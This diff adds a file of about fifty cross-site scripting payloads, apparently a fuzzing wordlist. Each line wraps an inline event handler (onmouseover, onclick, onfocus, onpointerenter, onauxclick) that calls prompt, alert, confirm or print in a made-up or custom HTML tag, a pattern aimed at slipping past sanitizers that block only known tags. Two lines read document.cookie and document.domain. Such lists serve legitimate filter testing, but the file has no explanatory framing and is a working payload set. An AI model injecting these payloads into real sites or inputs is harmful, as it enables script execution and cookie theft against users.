@@ -1,0 +1,50 @@
+<xss onmouseover=prompt(1)>x</xss>
+<xss onmouseover=alert(1)>x</xss>
+<xss onmouseover=confirm(1)>x</xss>
+<xss onmouseover=print()>x</xss>
+<xss onclick=prompt(1)>x</xss>
+<xss onclick=alert(1)>x</xss>
+<xss onclick=confirm(1)>x</xss>
+<xss onclick=print()>x</xss>
+<xss id=x tabindex=1 onfocus=prompt(1)>#x</xss>
+<xss id=x tabindex=1 onfocus=alert(1)>#x</xss>
+<xss id=x tabindex=1 onfocus=confirm(1)>#x</xss>
+<xss id=x tabindex=1 onfocus=print()>#x</xss>
+<xss id=x tabindex=1 onfocus=alert(document.cookie)>#x</xss>
+<xss id=c tabindex=1 onfocus=alert(document.domain)>#c</xss>
+<xss onpointerenter=prompt(1)>x</xss>
+<xss onpointerover=prompt(1)>x</xss>
+<xss onauxclick=prompt(1)>x</xss>
+<xss onmouseover="prompt(1)">x</xss>
+<xss onclick="prompt(1)">x</xss>
+<xss id=x tabindex=1 onfocus="prompt(1)">#x</xss>
+<xss onmouseover = prompt(1)>x</xss>
+<xss onclick = prompt(1)>x</xss>
+<xss id=x tabindex=1 onfocus = prompt(1)>#x</xss>
+<x-x onmouseover=prompt(1)>x</x-x>
+<x-x onclick=prompt(1)>x</x-x>
+<x-x id=x tabindex=1 onfocus=prompt(1)>#x</x-x>
+<x-ss onmouseover=prompt(1)>x</x-ss>
+<x-ss onclick=prompt(1)>x</x-ss>
+<x-ss id=x tabindex=1 onfocus=prompt(1)>#x</x-ss>
+<custom onmouseover=prompt(1)>x</custom>
+<custom onclick=prompt(1)>x</custom>
+<custom id=x tabindex=1 onfocus=prompt(1)>#x</custom>
+<my-tag onmouseover=prompt(1)>x</my-tag>
+<my-tag onclick=prompt(1)>x</my-tag>
+<my-tag id=x tabindex=1 onfocus=prompt(1)>#x</my-tag>
+<widget onmouseover=prompt(1)>x</widget>
+<widget onclick=prompt(1)>x</widget>
+<widget id=x tabindex=1 onfocus=prompt(1)>#x</widget>
+<foo onmouseover=prompt(1)>x</foo>
+<foo onclick=prompt(1)>x</foo>
+<foo id=x tabindex=1 onfocus=prompt(1)>#x</foo>
+<bar onmouseover=prompt(1)>x</bar>
+<bar onclick=prompt(1)>x</bar>
+<bar id=x tabindex=1 onfocus=prompt(1)>#x</bar>
+<app onmouseover=prompt(1)>x</app>
+<app onclick=prompt(1)>x</app>
+<app id=x tabindex=1 onfocus=prompt(1)>#x</app>
+<element onmouseover=prompt(1)>x</element>
+<element onclick=prompt(1)>x</element>
+<element id=x tabindex=1 onfocus=prompt(1)>#x</element>
